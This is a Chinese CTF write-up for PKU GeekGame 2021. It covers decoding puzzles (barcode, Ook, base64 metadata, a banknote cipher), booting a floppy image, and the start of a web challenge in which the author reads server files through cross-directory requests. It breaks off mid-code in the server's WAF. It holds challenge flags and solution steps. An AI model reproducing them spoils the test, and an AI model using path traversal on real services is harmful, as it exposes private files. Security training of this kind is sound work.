<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>d3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> d3<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
            target<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            target<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'barcode.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/barcode.png" alt="barcode"></p>
<p>扫码得到 </p>
<pre class="line-numbers language-none"><code class="language-none">xmcp.ltd/KCwBa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>访问</p>
<pre class="line-numbers language-none"><code class="language-none">你还记得高中的时候吗？那时在市里的重点中学，我们是同桌。我以前还怪讨人嫌的，老是惹你生气，然后你就不和我说话，我就死乞白赖地求你，或者讲笑话逗你。

不过，你笑起来好可爱，从小就好可爱。此后的一切，也都是从那个笑容开始的吧。

真的，好想回到那个时候啊。

Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?
Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?
Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.
Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.
Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?
Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook?
Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook!
Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?
Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?
Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?
Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?
Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook? Ook. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可恶的 ook 编码，<a target="_blank" rel="noopener" href="http://tool.bugku.com/brainfuck/">解码</a> 得到第一个 flag</p>
<p><code>flag{y0u_h4ve_f0rgott3n_7oo_much}</code></p>
<p>抢了个一血，好耶！</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113195028367.png"></p>
<h3 id="幻夢界"><a href="#幻夢界" class="headerlink" title="幻夢界"></a>幻夢界</h3><p>再看这个音频，发现有个奇怪的字符串</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113130536102.png"></p>
<pre class="line-numbers language-none"><code class="language-none">aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者格式工厂啥的看下信息。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117050948591.png"></p>
<pre class="line-numbers language-none"><code class="language-none">General
Complete name                            : LeafsNewSong.mp3
Format                                   : MPEG Audio
File size                                : 4.30 MiB
Duration                                 : 58 s 70 ms
Overall bit rate mode                    : Constant
Overall bit rate                         : 320 kb/s
Album                                    : Secret in Album Cover!!
Track name                               : 叶子的新歌
Track name/Total                         : aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy
Performer                                : 叶子
Writing library                          : Lavf58.45.100
Cover                                    : Yes
Cover type                               : Cover (front)
Cover MIME                               : image/png
TSS                                      : Logic Pro X 10.7.0
iTunNORM                                 :  0000072C 00000736 00003208 00003140 00009E92 0000501A 00006703 00007E86 00007678 00007E1F
iTunSMPB                                 :  00000000 00000210 000007A5 00000000002709CB 00000000 002350D1 00000000 00000000 00000000 00000000 00000000 00000000
USLT                                     : 空无一人的房间 / 我望向窗外 / 想回到昨天 /  / 琥珀色的风 / 能否将 回忆传到那边 / 闪烁的星 / 照亮夜空 连成我的思念 /  / 你 在梦的另一边 / 站在 日落的地平线 / 背离这世界而去 / 想 在回不去的时间里 / 遇见你 遇见你 遇见你 / 遇见你 遇见你 遇见你
comment                                  : 你还记得吗？小时候，我家和你家都在一个大院里。放学以后，我们经常一起在院子里玩。你虽然是个女孩子，但总是能和男孩子们玩到一块去。 /  / 夏天的时候我们挖蚯蚓、捉蚂蚱；冬天，院子里的大坡上积了一层雪，我们就坐在纸箱子压成的雪橇上，一次次从坡顶滑到坡底。那个时候你还发现，坐在铁簸箕上滑得更快。 /  / ——当然，那次你也摔得挺惨的。

Audio
Format                                   : MPEG Audio
Format version                           : Version 1
Format profile                           : Layer 3
Format settings                          : Joint stereo / MS Stereo
Duration                                 : 58 s 70 ms
Bit rate mode                            : Constant
Bit rate                                 : 320 kb/s
Channel(s)                               : 2 channels
Sampling rate                            : 44.1 kHz
Frame rate                               : 38.281 FPS (1152 SPF)
Compression mode                         : Lossy
Stream size                              : 2.22 MiB (52%)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>base64 </p>
<p><a target="_blank" rel="noopener" href="http://lab.maxxsoft.net/ctf/legacy.tbz2">http://lab.maxxsoft.net/ctf/legacy.tbz2</a></p>
<p>下载下来内容如下。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113130645000.png"></p>
<p>（怎么比赛的时候就没想到去启动啊，根本没注意到还有引导啊</p>
<p>新建一个虚拟机，配置软驱启动</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211204213619500.png"></p>
<p>然后就可以拿到 flag2 了。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211204213453588.png"></p>
<p>还给了个 final password: <code>ItsMeMrLeaf</code></p>
<p>当然也可以试试拿 qemu 启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 -drive <span class="token assign-left variable">format</span><span class="token operator">=</span>raw,file<span class="token operator">=</span>To_the_past.img<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="夢と現の境界"><a href="#夢と現の境界" class="headerlink" title="夢と現の境界"></a>夢と現の境界</h3><p>再看 img 里的内容</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117054107617.png"></p>
<pre class="line-numbers language-none"><code class="language-none">密码是：宾驭令诠怀驭榕喆艺艺宾庚艺怀喆晾令喆晾怀<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>或者用 VMware 把软驱以镜像的方式挂载进去</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211120010822879.png"></p>
</blockquote>
<p>直接试发现不行，查了一下发现是纸币箱号的暗语（？</p>
<blockquote>
<p>解释箱号分二步，第一步是把暗码转成明码，第二步是按明码进行查解，得到你要的数据。</p>
<p>第五套人民币：</p>
<p>例：06 玑驭喆诠    3296<br>06：代表是2006年生产的此卷；<br>玑：代表面值，是一个带栽王旁的字，玑是一元，玮是十元，奇谈的我没见过。<br>驭喆诠：这是一个暗语，翻译是<br>艺=1 驭=2 令=3 怀=4 庚=5 诠=6 宾=7 晾=8 喆=9 榕=10也就是0<br>驭喆诠就是296号<br>怀宾就是47号。<br>3296：钱币的流水号。</p>
<p><a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/400192266.html">https://zhidao.baidu.com/question/400192266.html</a></p>
<p>顺便，第四套：</p>
<p>例：00位打扎拉     1348<br>　　00：代表是2000年生产的此卷；<br>　　位：代表面值，是一个带单人旁的字，付是一角，位是二角，信是五角，仁是一元，伙是二元，佳士五元，大面值的我没见过，也用不到吧。<br>　　打扎拉：这是几个由提手旁组成的，是一个暗语，翻译是<br>　　扎-1 打-2 扛-3 抖-4 拉-5 持-6 捎-7 接-8 揖-9 搞-10也就是0<br>　　那么打扎拉就是215<br>　　再如持打搞就是620<br>　　扎就是1号<br>　　1348：钱币的流水号。<br>　　所以上面的字翻译成明语就是2000年二角215号，流水号1348</p>
<p>三版也一样，例：98公引乘徘振  0867<br>　　98：代表是1998年生产的此卷；<br>　　公：代表面值，公式一分，其他的的我没见过。<br>　　引乘徘振：这是一个暗语，翻译是<br>　　引-1 什-2 壮-3 扶-4 作-5 祥-6 振-7 徘-8 湃-9 乘-10也就是0<br>　　引乘徘振就是1087号<br>　　引引作就是115号<br>　　0867：钱币的流水号。</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">d <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>艺<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>驭<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>令<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>怀<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>庚<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>诠<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>宾<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>晾<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>喆<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span>榕<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token string">"宾驭令诠怀驭榕喆艺艺宾庚艺怀喆晾令喆晾怀"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到 <code>72364209117514983984</code>，解压。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117054725000.png"></p>
<p>红白机啊。。下了个 <code>FCEUX.EXE</code> 模拟器，又找了个经典红白机的游戏合集 <a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv12794533">【红白机完全档案】全红白机FC游戏合集（三）</a> ，发现模拟的文件是 <code>.nes</code>，这个不对啊……</p>
<p>再看 readme，找不同。。</p>
<p>left/right 对比</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117061802703.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117060925954.png"></p>
<p>再随便看个 .nes 的文件</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117061651692.png" alt=".nes"></p>
<p>4E45531A，草，就是把差异的部分提取出来嘛。</p>
<p>想了半天不知道怎么 diff 导出到文件比较好。最后先拿 010 editor 做了个 diff，导出到 csv，然后写了个脚本提取左右差异的部分，导出到 bin 文件。</p>
<p>最后再拿 fceux 模拟器跑一跑，然而不知道为啥我导出来的 binary 文件跑不起来，界面一片灰。估计哪里 diff 锅了吧（？</p>
<p>后面再来复现（咕</p>
<h2 id="Flag即服务"><a href="#Flag即服务" class="headerlink" title="Flag即服务"></a>Flag即服务</h2><blockquote>
<p>You 酱听说最近 *aaS 概念十分火热，无论什么都可以做成开放的 API，就像连接着每个设备的一条分布式软总线，可以跨越编程语言和操作系统的限制，实现任何想做的功能。有了 *aaS，我们就离元宇宙更近一步了呢。</p>
<p>受此鼓舞，You酱用一天时间开发出了震撼人心的新项目 JSON-as-a-Service，要解决困扰全世界开发者几十年的 JSON 格式转换难题。</p>
<p>她在自己保存 Flag 的服务器上部署了这个服务，并发给你了一个链接，想请你体验一下。</p>
</blockquote>
<h3 id="零·获得代码"><a href="#零·获得代码" class="headerlink" title="零·获得代码"></a>零·获得代码</h3><p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113153814140.png"></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113153822261.png"></p>
<p>这里的 dockerfile 提示了我们这个提供的文件在 data 目录下 </p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM node:14
WORKDIR /usr/src/app
COPY path/to/server_source_code .
COPY path/to/demo.json data/
RUN npm install
EXPOSE 3001
CMD [ "npm", "start" ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那试试能不能跨目录读取呢？</p>
<p>nodejs，那就读下 <code>package.json</code></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211113153727949.png"></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"demo-server"</span><span class="token punctuation">,</span><span class="token property">"version"</span><span class="token operator">:</span><span class="token string">"1.0.0"</span><span class="token punctuation">,</span><span class="token property">"description"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"scripts"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"start"</span><span class="token operator">:</span><span class="token string">"node --max-http-header-size=32768 start.js"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"You"</span><span class="token punctuation">,</span><span class="token property">"license"</span><span class="token operator">:</span><span class="token string">"WTFPL"</span><span class="token punctuation">,</span><span class="token property">"dependencies"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"jsonaas-backend"</span><span class="token operator">:</span><span class="token string">"https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>读其他文件会说 <code>Cannot parse file as JSON!</code>，所以直接下载下来看源码吧。</p>
<p><code>index.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> helmet <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'helmet'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token punctuation">{</span>getflag<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./getflag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span>safe_eval<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./safe_eval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> <span class="token constant">FLAG0</span> <span class="token operator">=</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token string">'flag0.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> <span class="token constant">FLAG1</span> <span class="token operator">=</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token string">'flag1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> <span class="token constant">FLAG2</span> <span class="token operator">=</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token string">'flag2.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">MAX_LENGTH</span> <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">helmet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    secret<span class="token operator">:</span> <span class="token string">'ctl7nk2s170srnivd4r7vj9rh5dv4dgi'</span><span class="token punctuation">,</span>
    resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'settings'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'this feature is currently under development :('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'readme.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>root<span class="token operator">:</span> <span class="token string">'.'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> bad_name <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">)</span>
